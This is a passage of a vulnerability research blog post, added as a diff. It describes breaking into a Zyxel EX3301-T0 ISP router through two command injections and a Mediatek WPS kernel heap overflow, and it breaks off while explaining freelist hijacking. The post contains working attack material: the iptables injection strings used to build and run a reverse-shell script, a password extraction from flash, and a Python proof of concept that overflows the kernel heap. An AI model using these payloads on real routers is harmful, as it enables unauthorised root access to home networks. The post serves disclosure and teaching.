@@ -1,0 +1,787 @@
+---
+layout: post
+title: From breaking into my ISP router to finding a Mediatek kernel 0day
+date: 2025/06/01
+tags: iot 0day
+permalink: /posts/rce-on-isp-router-and-mediatek-0day
+header:
+  teaser: /assets/images/posts/2026-06-01/teaser.png
+---
+
+{% raw %}Hi there! In this blog post, I will be discussing how I broke into my ISP router by using a command injection, then found another even better command injection inside, and how I ended up finding and exploiting a remote heap overflow in the kernel driver of its Mediatek chip. These vulnerabilities have been disclosed over the past months and have been assigned the following CVEs:
+
+  - CVE-2025-13942: Zyxel unauthenticated command injection in UPnP daemon
+  - CVE-2025-13943: Zyxel authenticated command injection in log export CGI
+  - CVE-2026-20452: Mediatek MTXXX WPS heap overflow
+
+As usual, this research is heavily based on reverse engineering and a fair amount of trial and error, so excuse me if there are any mistakes, specially in low level kernel stuff, since this is a very complex topic. If you find something that is awfully wrong and want to help me correct it, I am absolutely open to it. Anyways, let's start with the blog, since there is a lot to cover.
+
+<img src="/assets/images/posts/2026-06-01/header.png" style="width: 30em">
+
+
+----[ Some context ]----------------------------------
+
+This journey begins in late summer 2025, when my colleague <a href="https://x.com/s3rg0x">Sergio</a> and I decided to give <a href="https://www.zerodayinitiative.com/Pwn2OwnIreland2025Rules.html">Pwn2Own Ireland 2025</a> a shot, targeting a couple of embedded devices. However, we underestimated the tight timeframe of the competition, and our day jobs did not leave us with enough time to properly focus on it. After many intense days (and nights) of hacking, we were not able to come up with a working exploit (although we did collect a decent number of DoS scripts lol). After dealing with the frustration, I decided to take a break from hacking for a few months and dedicate my free time to resting and enjoying life. Of course, that did not happen and, instead, I somehow ended up diving into this massive research project.
+
+The thing is that I had changed my Internet provider a couple of months ago, so my new ISP had delivered a new router. Although I am obviously not going to refer to this ISP by its name because it probably won't ever fix anything described in here, it is a medium sized one here in Spain that was gaining a lot of popularity at the moment due to offering good quality Internet at a low price. So, as always, I wanted to know what was inside this new router that would effectively act as the door to my home.
+
+The router was a Zyxel device, but I did not know the model yet. I noticed that it supported both SSH and telnet, so I connected using the credentials that the ISP guy gave me when installing the router ('user:user') and was presented with a restricted Zyxel shell:
+
+<code>$ ssh -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedAlgorithms=+ssh-dss user@192.168.1.1
+
+user@192.168.1.1's password:
+No entry for terminal type "xterm-256color";
+using dumb terminal settings.
+ZySH> ?
+cfg                       - DAL command line interface
+debug                     - &#60;N/A&#62;
+dns                       - ZYXEL command line
+dsllinestatus             - Show Econet DSL line status
+ethwanctl                 - ZYXEL command line
+exit                      - Close an active terminal session
+history                   - Display or clear CLI history
+ifconfig                  - Show network interface configuration
+ping                      - Send ICMP ECHO_REQUEST to network hosts
+pppoectl                  - ZYXEL command line
+sys                       - ZYXEL command line
+tcpdump                   - Text based packet capture utility
+traceroute                - monitor each routed node during whole routing path to &#60;host&#62;
+vcautohuntctl             - ZYXEL command line
+voicedbgcli               - ZYXEL command line
+wan                       - ZYXEL command line
+wlan                      - ZYXEL command line
+zycli                     - ZYXEL command line
+ZySH> sys atsh
+Firmware Version        : V5.50(ABVY.3.9)b2_G0
+Bootbase Version        : V1.44 | 10/15/2021 11:54:15
+Vendor Name             : Zyxel Communications Corp.
+Product Model           : EX3301-T0
+Serial Number           : [...]
+First MAC Address       : [...]
+Last MAC Address        : [...]
+MAC Address Quantity    : 16
+Default Country Code    : 00
+Boot Module Debug Flag  : 00
+Kernel Checksum         : BF1D51FF
+RootFS Checksum         : 729CFB55
+Romfile Checksum        : 0000FB24
+Main Feature Bits       : 00
+Other Feature Bits      :
+7f89c039: 0405050d 00000100 00000000 00000000
+7f89c049: 00000000 00000000 00000000
+ZySH></code>
+
+I was able to obtain some info of the device, such as the model name, which was EX3301-T0. However, most commands did not work properly or needed admin privileges, and those that were available only allowed very basic configuration, so no direct access to the OS. Then, I opened my browser and navigated to the router web interface, in which I also logged in using the same 'user' credentials:
+
+<img src="/assets/images/posts/2026-06-01/user_admin_panel.png" style="width: 40em">
+
+After navigating around, it quickly became obvious that this was a very restricted interface too, since it did not allow uploading a new firmware nor enabling proper access over SSH nor any other protocol. This is a common practice in ISP routers, so that users cannot modify the ISP configuration. At this point, as anyone who wants to access its router would do, I opened it to try finding a UART interface or something similar, which was easy enough since the UART port had debug pins already attached:
+
+<img src="/assets/images/posts/2026-06-01/pcb.png" style="width: 35em">
+
+Connecting to the UART interface revealed console output and the same restricted shell as in SSH:
+
+<code>EX3301-T0 Username: user
+Password: 
+ZySH> ?
+cfg                       - DAL command line interface
+debug                     - &#60;N/A&#62;
+dns                       - ZYXEL command line
+dsllinestatus             - Show Econet DSL line status
+ethwanctl                 - ZYXEL command line
+exit                      - Close an active terminal session
+history                   - Display or clear CLI history
+ifconfig                  - Show network interface configuration
+ping                      - Send ICMP ECHO_REQUEST to network hosts
+pppoectl                  - ZYXEL command line
+sys                       - ZYXEL command line
+tcpdump                   - Text based packet capture utility
+traceroute                - monitor each routed node during whole routing path to &#60;host&#62;
+vcautohuntctl             - ZYXEL command line
+voicedbgcli               - ZYXEL command line
+wan                       - ZYXEL command line
+wlan                      - ZYXEL command line
+zycli                     - ZYXEL command line
+ZySH></code>
+
+Regarding the bootloader, the device used a Zyxel proprietary one ('ZyXEL zloader v1.4.4'). It allowed stopping autoboot, but only exposed another Zyxel restricted shell in which no boot commands could be easily modified to later access the OS, as it is <a href="https://www.synacktiv.com/publications/i-hack-u-boot">sometimes possible with U-Boot</a>:
+
+<code>ZyXEL zloader v1.4.4 (10/15/2021 - 11:54:15)
+Multiboot client version: 2.5
+Not found TC Phy
+Not found TC Phy
+Not found TC Phy
+Not found TC Phy
+Not found TC Phy
+  GE Rext AnaCal Done! (5)(0x1b)
+
+Hit any key to stop autoboot:  5
+
+ZHAL> help
+ATEN    x[,y]         set BootExtension Debug Flag (y=password)
+ATSE    x             show the seed of password generator
+ATDC                  disable check model mechanism
+ATSH                  dump manufacturer related data in ROM
+ATRT    [x,y,z,u]     RAM read/write test (x=level, y=start addr, z=end addr, u=iterations)
+ATGO                  boot up whole system
+ATSR    [x]           system reboot
+ATUR    x[,y]         upgrade RAS image (filename, partition number)
+ZHAL></code>
+
+In short, no easy access to the device :(
+  
+Then, I started looking around on the Internet to check if people had found an easy way in that did not require too much effort. I ended up finding an article, which I won't be sharing because it explicitly names the ISP, that described a way of extracting the admin password from the web interface. It basically exploited an authenticated command injection in the dynamic DNS configuration page. I tried this technique, but nothing seemed to happen. Also, when introducing special characters in other forms to check if there was any other easy command injections, an error message appeared ("It is not possible to write special characters") and no request was sent:
+
+<img src="/assets/images/posts/2026-06-01/no_special_chars.png" style="width: 25em">
+
+Further analysis revealed that authenticated HTTP requests had their bodies encrypted, which was enough to keep me away for the moment. I stopped there and did not continue further.
+
+
+----[ Breaking into the router ]----------------------
+
+However, as usual, I could not stop thinking about this, since the fact that there had been in the past such an easy command injection in my router felt like an invitation to break in. So, I created a new folder for this project in my vuln research directory and started diving deeper into this. First thing first, I did a proper network port scan, since I had not executed one earlier because I was only "taking a look":
+
+<code>$ nmap -sV -O -Pn -p- -oN nmap.log 192.168.1.1
+
+Nmap scan report for _gateway (192.168.1.1)
+Host is up (0.00072s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp
+22/tcp    open  ssh         (protocol 2.0)
+23/tcp    open  telnet
+53/tcp    open  domain      ISC BIND 9.18.41
+80/tcp    open  http
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp   open  ssl/https
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+2601/tcp  open  zebra?
+38400/tcp open  unknown
+49152/tcp open  unknown
+49153/tcp open  unknown
+
+[...]</code>
+
+The FTP server allowed login as 'user', but only granted access to '/home/user', which was empty. As for 'zebra', it is a known daemon from the Quagga routing suite used for routing management. The more unusual ports, 38400, 49152 and 49153, were associated with the following UPnP devices:
+<ol><li>Port 38400 - 'InternetGatewayDevice': Allows LAN clients to perform NAT operations, such as adding port mappings or controlling firewall rules, using the <a href="https://openconnectivity.org/developer/specifications/upnp-resources/upnp/internet-gateway-device-igd-v-2-0/">OCF Device Control Protocol</a>.</li>
+<li>Ports 49152/49153 - 'WFADevice': Allows clients to configure 802.11 parameters (SSID, PSK, security settings) over IP using WPS using the <a href="https://www.wi-fi.org/system/files/WFA_Device_1_0_Template_1_01_0.pdf">Wi-Fi Alliance Device Control Protocol</a>.</li></ol>
+However, none of these offered direct access to the OS.
+
+So, given I had no clear way in, I decided to download the regular <a href="https://www.zyxel.com/global/en/support/download?model=ex3301-t0">firmware for Zyxel EX3301-T0 routers from the vendor page</a> and compare it to my ISP router. This way, I could check if they were similar enough to find something in the default firmware that also affected my device. I knew for sure that my ISP had modified it a bit, since some logos, colors and a lot of logs from the UART output confirmed it, but I believed core functionalities would remain the same.
+
+I extracted the firmware using 'binwalk', which gave me a squashfs filesystem:
+
+<code>$ binwalk V550ABVY6.2C0.bin
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+372           0x174           LZMA compressed data, properties: 0x6C, dictionary size: 8388608 bytes, uncompressed size: 16279488 bytes
+4180222       0x3FC8FE        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 26706310 bytes, 2393 inodes, blocksize: 262144 bytes, created: 2025-04-11 08:20:33</code>
+
+With the filesystem extracted, my main targets were the UPnP services that appeared in the nmap scan, since UPnP tends to be poorly secured and binaries implementing it are usually relatively straightforward to reverse. However, I could not find any binary that listened on port 38400 or implemented the 'InternetGatewayDevice', so I assumed this was something added by the ISP. Regarding ports 49152 and 49153, corresponding to the 'WFADevice', the binary behind them was '/usr/bin/wscd'. However, I found that most available commands simply forwarded user input to kernel space using 'ioctl', which seemed quite complicated at the moment (keep this in mind, as it will be relevant later).
+
+By then, I just wanted a quick way inside the router, so I did not care about the potential findings requiring authentication, so I decided to take a look into the web interface, since I already knew that there had been command injections found there in the past.
+
+I quickly found the executable '/bin/zhttpd', which looked like the one behind the web server. I opened Ghidra and started reversing it. For this research, I used Claude a lot, since it can be connected to Ghidra using Claude desktop and <a href="https://github.com/LaurieWired/GhidraMCP">GhidraMCP</a>. Although Claude still has many flaws when diving deep into reversing and exploitation, it is pretty much useful in the initial phase, in which the main goal is just figuring out which are the most interesting functions of an executable, tracing user input, identifying global tables, figuring out structures, etc.
+
+Using this setup, I quickly identified a global table that mapped routes with their handler functions:
+
+<img src="/assets/images/posts/2026-06-01/zhttpd_routing_table.png" style="width: 40em">
+
+This allowed me to confirm that the '/bin/zhttpd' binary that I had was close enough with the one in my ISP router, since most of these routes were accessible.
+
+After a quick look at each of them, '/cgi-bin/LogResult?action' caught my attention, which was mapped to function 'zHttpLogHandle'. This endpoint was responsible for managing device log operations and supported multiple actions through the 'action' parameter, such as creating network traffic captures ('START_CAPTUR', 'STOP_CAPTUR'), deleting logs ('DEL_LOG'), exporting logs ('EXPORT_LOG'), etc. In order to manage network traffic captures, it used system commands to execute and then stop 'tcpdump':
+
+<img src="/assets/images/posts/2026-06-01/zhttpd_start_stop_captur.png" style="width: 40em">
+
+When executing the log export functionality, function 'copyLog' was called, which reads a previously generated 'tcpdump' capture file and writes its contents into a new log file. The problem here is that 'copyLog' processes the network capture line by line using 'fgets' and then, for each line read, it constructs a shell command using a 'snprintf' wrapper. Then, it directly executes it using 'system':
+
+<img src="/assets/images/posts/2026-06-01/zhttpd_copyLog.png" style="width: 40em">
+
+Since this process does not include any sanitization of the binary data that comes out of the network capture, any string containing shell metacharacters will be interpreted by the shell and later executed, enabling remote command execution. Perfect.
+
+Now, in order to exploit this, the attacker had to be authenticated. As I previously mentioned, all authenticated requests to the web interface were encrypted, but this could be easily reversed since all encryption logic happened in clientside JavaScript:
+
+<img src="/assets/images/posts/2026-06-01/zhttpd_encryption.png" style="width: 45em">
+
+So, I quickly crafted an exploit that executed the following:
+
+  1. Authenticate to the web interface with valid credentials to obtain a session key.
+  2. Start a network traffic capture
+  3. Send an HTTP request to the router with a header containing a command injection payload.
+  4. Stop the network traffic capture 
+  5. Trigger the vulnerability by requesting a log export
+
+After some bugfixing, I successfully got a root shell on the device:
+
+<img src="/assets/images/posts/2026-06-01/zhttpd_poc.png" style="width: 40em">
+
+This vulnerability was reported to Zyxel and assigned CVE-2025-13943. You can take a deeper look into the exploit and all affected devices <a href="https://github.com/hacefresko/CVEs/tree/main/CVE-2025-13943">at my github page</a>.
+
+
+----[ Exploring the device ]--------------------------
+
+Once inside, the first thing I did was to extract the 'admin' password. To do so, I just followed the article mentioned previously, which described how to obtain it directly from the bootloader memory:
+
+<code>/ # mtd -q -q readflash /tmp/flashdump 256 65280 bootloader
+/ # grep -a "[\x80-\xFF]" /tmp/flashdump > /tmp/pass</code>
+
+The password was a random 10 alphanumeric string which seemed unique for this device, and it worked for both 'admin' and 'root' users. Once obtained, I was able to fully access the device using both SSH and UART.
+
+Then, I proceeded to do some basic recon, in order to find which services were really exposed on the device and see if they matched what I saw earlier in the network scan:
+
+<code># netstat -natpul
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1634/smbd
+tcp        0      0 192.168.1.1:38400       0.0.0.0:*               LISTEN      2867/zupnp
+tcp        0      0 0.0.0.0:49152           0.0.0.0:*               LISTEN      2835/wscd
+tcp        0      0 0.0.0.0:49153           0.0.0.0:*               LISTEN      2832/wscd
+tcp        0      0 0.0.0.0:2601            0.0.0.0:*               LISTEN      2884/zebra
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1634/smbd
+tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      3032/dnsmasq
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      1395/pure-ftpd (SER
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1411/dropbear
+tcp        0      0 :::445                  :::*                    LISTEN      1634/smbd
+tcp        0      0 :::139                  :::*                    LISTEN      1634/smbd
+tcp        0      0 :::80                   :::*                    LISTEN      1424/zhttpd
+tcp        0      0 :::53                   :::*                    LISTEN      3032/dnsmasq
+tcp        0      0 :::21                   :::*                    LISTEN      1395/pure-ftpd (SER
+tcp        0      0 :::22                   :::*                    LISTEN      1411/dropbear
+tcp        0      0 :::23                   :::*                    LISTEN      1400/telnetd
+tcp        0      0 :::7547                 :::*                    LISTEN      1540/ztr69
+tcp        0      0 :::443                  :::*                    LISTEN      1424/zhttpd
+udp        0      0 127.0.0.1:13728         0.0.0.0:*                           506/zywifid
+udp        0      0 0.0.0.0:58789           0.0.0.0:*                           2832/wscd
+udp        0      0 127.0.0.1:35251         0.0.0.0:*                           2835/wscd
+udp        0      0 0.0.0.0:42942           0.0.0.0:*                           -
+udp        0      0 0.0.0.0:52944           0.0.0.0:*                           3032/dnsmasq
+udp        0      0 0.0.0.0:7678            0.0.0.0:*                           3040/zstun
+udp        0      0 127.0.0.1:35884         0.0.0.0:*                           2832/wscd
+udp        0      0 0.0.0.0:53              0.0.0.0:*                           3032/dnsmasq
+udp        0      0 0.0.0.0:67              0.0.0.0:*                           3032/dnsmasq
+udp        0      0 0.0.0.0:60006           0.0.0.0:*                           506/zywifid
+udp   253440      0 0.0.0.0:1900            0.0.0.0:*                           2867/zupnp
+udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2832/wscd
+udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2835/wscd
+udp        0      0 :::546                  :::*                                2953/dhcp6c
+udp        0      0 :::53                   :::*                                3032/dnsmasq</code>
+
+The output mostly confirmed what I already knew and allowed identifying some UDP services. However, the one that caught my attention was TCP port 38400, since its corresponding binary, and therefore the one exposing the UPnP 'InternetGatewayDevice', was 'zupnp'. This binary was nowhere to be found in the stock EX3301-T0 firmware, which meant it was either an ISP-developed binary or part of some Zyxel SDK made available to OEMs. Anyways, the fact that it wasn't in the public firmware made it an interesting target for me, so I loaded it into Ghidra and started reversing it.
+
+The UPnP 'InternetGatewayDevice' allowed interacting with several UPnP services with many different commands. The most interesting one was 'AddPortMapping', from the 'WANPPPConnection' service, which accepted a lot of user parameters in order to create a new NAT port forwarding rule. To handle this command, function 'zupnpPortMappingExecute' was eventually executed, which then called another function at address '0x0040f390' that processed the supplied parameters and added the corresponding NAT rule in the system firewall using 'iptables'. However, this last function did not implement any validation on user parameters, which got inserted directly into the 'iptables' command that got executed using 'zsystem', a 'system' wrapper:
+
+<img src="/assets/images/posts/2026-06-01/zupnp_snprintf.png" style="width: 40em">
+
+This obviously constituted another command injection vulnerability, this time in an unauthenticated service. Exploitation was a bit trickier, though. The parameters susceptible to injection, 'NewRemoteHost' and 'NewInternalClient', were copied into fixed-size local buffers using 'strncpy' before being inserted into the command string, limiting each of them to 15 characters:
+
+<img src="/assets/images/posts/2026-06-01/zupnp_strncpy.png" style="width: 40em">
+
+This meant that a single request was not enough to inject a meaningful payload. To work around this, I created an exploit that builds a temporary script on the device character by character across multiple requests and then executes it. Since both 'NewRemoteHost' and 'NewInternalClient' are inserted into the same 'iptables' command at different positions, both fields can be injected simultaneously on each request. 'NewRemoteHost' is used to define a shell variable containing the path of the temporary script with 'a=/tmp/a', while 'NewInternalClient' is used to append one character at a time to it with 'printf X>>$a', where 'X' is the character being written. The full command executed on each request is the following:
+
+<code class="language-bash">iptables -t nat -A NAT_PORT_MAPPING_UPNP_1 -p tcp --source ;a=/tmp/a;" --dport 1337 -j DNAT --to ";printf X>>$a;:1337</code>
+
+The command gets divided into the following separate commands:
+
+<code class="language-bash">iptables -t nat -A NAT_PORT_MAPPING_UPNP_1 -p tcp --source ;
+a=/tmp/a;                       # NewRemoteHost
+" --dport 1337 -j DNAT --to ";
+printf X>>$a;                   # NewInternalClient
+:1337</code>
+
+Note that the quotes are intentionally injected as part of the exploit. Since the shell would otherwise stop executing after the first injected command, the closing quote from 'NewRemoteHost' and the opening quote from 'NewInternalClient' are used to keep the rest of the 'iptables' command syntactically valid, ensuring all injected commands are executed. 
+
+Once the full reverse shell command is assembled in '/tmp/a', a final request executes it with ';sh /tmp/a;', achieving unauthenticated Remote Code Execution as root :D
+
+<img src="/assets/images/posts/2026-06-01/zupnp_poc.png" style="width: 40em">
+
+Again, this vulnerability was reported to Zyxel, who confirmed that 'zupnp' was part of a deprecated Zyxel SDK that many ISPs still implemented. It was assigned CVE-2025-13942 and you can take a deeper look into the exploit and all affected devices <a href="https://github.com/hacefresko/CVEs/tree/main/CVE-2025-13942">at my github page</a>. 
+
+
+----[ Diving into the kernel ]------------------------
+
+Great, I had discovered two command injections: one in the web interface, and one in the UPnP service. But now that I had gained a fairly good understanding of the device, I wanted to try finding something more complex that would let me really explore exploitation development in the wild. Something like a stack overflow with binary protections or a complex UAF. Or maybe... something in the kernel. Remember those UPnP ports exposing  'WFADevice'? They forwarded user input directly to the kernel via 'ioctl'. Also, this device ran a very old MIPS Linux kernel, which likely had few modern protections, so this seemed like a nice introduction to kernel exploitation if I could find something.
+
+So first, I opened again the '/usr/bin/wscd' binary in Ghidra and began to dig deeper. As I already discussed earlier, it exposed the standardized UPnP 'WFADevice', which allowed configuration of WiFi parameters over IP using WPS. In this case, this UPnP device only implemented one service, named <a href="https://www.wi-fi.org/system/files/WFA_WLANConfig_1_0_Template_1_01.pdf">'WFAWLANConfig'</a>. Although the standard protocol describes several commands, 'wscd' only implemented 4 of them:
+
+- GetDeviceInfo
+- PutMessage
+- PutWLANResponse
+- SetSelectedRegistrar
+
+Command 'GetDeviceInfo' didn't have parameters, since it only retrieved some WiFi related information. However, the other three commands did accept user input, and all of them ended up calling 'wsc_set_oid', which sent that input straight into the kernel via 'ioctl' using command '0x8BE1':
+
+<img src="/assets/images/posts/2026-06-01/wscd_ioctl.png" style="width: 40em">
+
+This command '0x8BE1' falls within the <a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/wireless.h#L328">Linux Wireless Extensions private range</a> (0x8BE0-0x8BFF), which means it bypasses the generic network stack entirely and is handled by the private handler of the corresponding network drivers. In this case, the WiFi chipset was from Mediatek, so the network drivers were made by Mediatek too, and they were compiled directly within the kernel. This all meant that, in order to follow the user input from there, I had to get my hands dirty and start reversing some kernel stuff.
+
+Next step then was to obtain the kernel image, which I extracted directly from the memory of the device: 
+
+<code># cat /proc/iomem
+00002000-0effffff : System RAM
+  00002000-0080734b : Kernel code
+  0080734c-00eae63f : Kernel data
+1fb90000-1fb9ffff : xhci-hcd
+20000000-2fffffff : pcie memory space
+  20000000-201fffff : PCI Bus 0000:01
+    20000000-200fffff : 0000:01:00.0
+      20000000-200fffff : 0000:01:00.0
+    20100000-20103fff : 0000:01:00.0
+      20100000-20103fff : 0000:01:00.0
+    20104000-20104fff : 0000:01:00.0
+      20104000-20104fff : 0000:01:00.0
+  20200000-203fffff : PCI Bus 0000:02
+    20200000-202fffff : 0000:02:00.0
+      20200000-202fffff : 0000:02:00.0
+    20300000-20303fff : 0000:02:00.0
+      20300000-20303fff : 0000:02:00.0
+    20304000-20304fff : 0000:02:00.0
+      20304000-20304fff : 0000:02:00.0
+# dd if=/dev/mem of=/tmp/kernel_code_data.bin bs=1 skip=8192 count=15386176
+15386176+0 records in
+15386176+0 records out
+15386176 bytes (14.7MB) copied, 123.994837 seconds, 121.2KB/s
+#</code>
+
+Then, I loaded it on Ghidra and set the corresponding memory base address, which was '0x80002000'. Since analyzing the whole kernel would take ages, I obtained the '/proc/kallsyms' file from the device, which holds kernel exported symbol definitions and their addresses, and imported them to Ghidra using a very quick vibe coded script. At this point I also noted that 'KASLR' was not enabled, so all symbol addresses were static and remained the same across reboots. With that, I had already over 25000 kernel functions located:
+
+<img src="/assets/images/posts/2026-06-01/kernel_functions.png" style="width: 35em">
+
+With Claude's help, I found that the function that handled 'ioctl' messages with command '0x8BE1' was 'rt28xx_ap_ioctl', which is a very consistent name for a Mediatek driver function considering the existence of Mediatek 'RT28xx' family of models. This 'rt28xx_ap_ioctl' function dispatched the 'ioctl' message based on which 'WFAWLANConfig' UPnP command had been sent, and ultimately called its corresponding handler function. With this, I already had the full picture, so I started to look for vulnerabilities.
+
+After reversing the code paths for the three available 'WFAWLANConfig' UPnP commands, I identified an issue in how the 'SetSelectedRegistrar' parameter is parsed inside 'WscSelectedRegistrar', its handler function in the kernel driver. The 'SetSelectedRegistrar' command is used within the WPS authentication flow to notify the access point about the state of an ongoing WPS operation, but the exact details are not important here. What matters is that 'SetSelectedRegistrar' accepts a single parameter, 'NewMessage', which is a base64-encoded string containing one or more TLV (Type-Length-Value) structures. The 'WscSelectedRegistrar' function receives the decoded buffer and processes each TLV sequentially. For TLV payloads with type '0x1049', it does the following:
+
+<code class="language-c">void WscSelectedRegistrar(int param_1, void *buf_ptr, uint buf_len, uint param_4) {
+    // ...
+    while( true ) {
+        memmove(&tlv_type, buf_ptr, 2);
+        memmove(&tlv_len, buf_ptr + 2, 2);
+
+        if (buf_len < tlv_len + 4) {
+            // error
+        }
+        buf_ptr = buf_ptr + 4;
+
+        if (tlv_type != 0x1049) break;
+
+        if (sub_item == 0x0) {
+            os_alloc_mem(0, &sub_item, tlv_len);  // kmalloc wrapper
+
+            if (sub_item == 0x0) {
+                // error
+            }
+        }
+        memset(sub_item, 0, tlv_len);
+
+        // extracts and copies sub-item from buf_ptr into sub_item
+        WscParseV2sub_item(1, buf_ptr, tlv_len, sub_item, sub_item_len);
+      
+        buf_len = (buf_len - tlv_len) - 4;
+        buf_ptr = buf_ptr + tlv_len;
+
+        if (buf_len < 5) break;
+    }
+    // ...
+}</code>
+
+For the first '0x1049' TLV, the function validates its type and size, allocates a new 'sub_item' buffer of 'tlv_len' bytes, clears it, and calls 'WscParseV2SubItem'. This function parses and validates sub-items within the TLV payload and copies the relevant data to the 'sub_item' buffer. However, for the next '0x1049' TLVs, type and size are validated again, but since 'sub_item' is no longer null, buffer allocation is skipped entirely. 'WscParseV2SubItem' then copies the sub-item within the new TLV into the same old 'sub_item' buffer. If the sub-item of the second TLV is larger than the first, the copy exceeds the allocated size and overflows into the next object on the kernel heap, producing a classic kernel heap overflow!
+
+So, I wrote a very simple PoC that sent a packet containing two '0x1049' TLVs, where the first contained a 20-byte sub-item and the second contained a 255-byte sub-item (maximum size since sub-item length is a 1-byte integer):
+
+<code class="language-python">import base64, requests
+
+target = "192.168.1.1"
+
+def build_tlv(type, value):
+    length = len(value)
+    return type.to_bytes(2, 'big') + length.to_bytes(2, 'big') + value
+
+def send_upnp_set_selected_registrar(payload):    
+    url = f"http://{target}:49152/control" 
+    headers = {
+        "SOAPAction": "\"urn:schemas-wifialliance-org:service:WFAWLANConfig:1#SetSelectedRegistrar\"",
+        "Content-Type": "text/xml"
+    }
+    data = f"""&#60;?xml version="1.0"?&#62;
+    &#60;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&#62;
+    &#60;SOAP-ENV:Body&#62;
+    &#60;m:SetSelectedRegistrar xmlns:m="urn:schemas-wifialliance-org:service:WFAWLANConfig:1"&#62;
+    &#60;NewMessage&#62;{base64.b64encode(payload).decode('ascii')}&#60;/NewMessage&#62;
+    &#60;/m:SetSelectedRegistrar&#62;
+    &#60;/SOAP-ENV:Body&#62;
+    &#60;/SOAP-ENV:Envelope&#62;"""
+    
+    requests.post(url, headers=headers, data=data, timeout=2)
+    
+payload  = b""
+payload += build_tlv(0x1049, b"\x00\x00\x00" + b"\x01\x14" + b"A" * 20)   # 20 bytes sub-item
+payload += build_tlv(0x1049, b"\x00\x00\x00" + b"\x01\xff" + b"A" * 255)  # 255 bytes sub-item
+send_upnp_set_selected_registrar(payload)</code>
+
+Then, I executed it... and immediately saw a kernel crash on the UART output!
+
+<img src="/assets/images/posts/2026-06-01/kernel_crash.png" style="width: 40em">
+
+That felt incredible. However, it was my first time dealing with a kernel crash, so having a working exploit was still a long way off. 
+
+
+----[ Intro to kernel exploitation ]------------------
+
+At this point, I started doing a lot of research into Linux kernel exploitation, specially in embedded and Mediatek devices. Out of all the resources I found, I must reference the following two, since they were the most helpful ones (and the most similar cases):
+
+- <a href="https://www.youtube.com/watch?v=qT3YFtGjiuQ">HEXACON 2025 - Arise from the Wireless: Breaking the Security Barrier in Wi-Fi by Xiaobye</a>
+- <a href="https://blog.coffinsec.com/0days/2025/12/15/more-like-mediarekt-amirite.html">hyprblog - mediatek? more like media-rekt, amirite.</a>
+
+After all the learning, I figured out that I needed to identify which adjacent heap objects I was overflowing into. Since I could not find a way to attach GDB to the kernel, the best approach I could think of was to crash the device repeatedly and analyze each kernel panic. The problem was that my testing device took around 3 minutes to reboot, meaning I had to send the overflowing payload and then sit around waiting before I could retry. This was my setup for the rest of the research, so I ended up spending half the time just waiting next to my computer while doing other things that did not require much attention, such as playing Portal 2 for the sixth time. You may not like it, but this is what peak kernel exploit development looks like for embedded devices:
+
+<img src="/assets/images/posts/2026-06-01/setup.jpeg" style="width: 40em">
+
+Jokes aside, after crashing the device for hours, I obtained a lot of information about adjacent kernel objects I could target, such as network or RCU structures. However, I failed miserably in trying to exploit them, since I only achieved control of the program counter but not shellcode execution. Without any address leak, trying to exploit adjacent objects remotely and without any debugging tools available was getting too difficult, so I had to look for an alternative.
+
+
+----[ Freelist hijacking ]----------------------------
+
+Some research later, I ended up going down a very different route, which was freelist hijacking, a technique that targets allocator internal structures rather than trying to corrupt adjacent objects directly. I learned this technique from the Hexacon 2025 talk I referenced earlier, where Xiaobye uses it to achieve remote code execution with a very similar Mediatek vulnerability. However, in order to understand freelist hijacking, let's first review some kernel allocator concepts.
+
+Inside the Linux kernel, heap memory is managed using the slab allocator (usually SLUB). It works by pre-allocating large regions of memory called slabs, each of which is divided into fixed-size objects. Same sized objects are grouped into caches, such as 'kmalloc-128' or 'kmalloc-256', which hold allocations of up to 128 bytes and 256 bytes respectively. There are also dedicated caches for frequently allocated kernel structures like network sockets. These caches can be inspected via '/proc/slabinfo':
+
+<code># cat /proc/slabinfo
+
+slabinfo - version: 2.1
+# name            &#60;active_objs&#62; &#60;num_objs&#62; &#60;objsize&#62; &#60;objperslab&#62; &#60;pagesperslab&#62; : tunables &#60;limit&#62; &#60;batchcount&#62; &#60;sharedfactor&#62; : slabdata &#60;active_slabs&#62; &#60;num_slabs&#62; &#60;sharedavail&#62;
+[...]
+RAW                  125    125    640   25    4 : tunables    0    0    0 : slabdata      5      5      0
+UDP                   46     46    704   23    4 : tunables    0    0    0 : slabdata      2      2      0
+tw_sock_TCP           21     21    192   21    1 : tunables    0    0    0 : slabdata      1      1      0
+TCP                   24     24   1344   24    8 : tunables    0    0    0 : slabdata      1      1      0
+[...]
+kmalloc-2048        9565   9584   2048   16    8 : tunables    0    0    0 : slabdata    599    599      0
+kmalloc-1024         576    576   1024   16    4 : tunables    0    0    0 : slabdata     36     36      0
+kmalloc-512         9939  10000    512   16    2 : tunables    0    0    0 : slabdata    625    625      0
+kmalloc-256         1300   1344    256   16    1 : tunables    0    0    0 : slabdata     84     84      0
+kmalloc-128        12878  13088    128   32    1 : tunables    0    0    0 : slabdata    409    409      0
+[...]
+</code>
+
+To track which objects are available, the allocator maintains a freelist, which is essentially a linked list chaining all free objects together. Each free object stores a pointer at its start that points to the next free object in the same cache. When a new allocation is requested, the allocator pops the head of the freelist and returns that object. When an object is freed, it is pushed back onto the freelist.
+
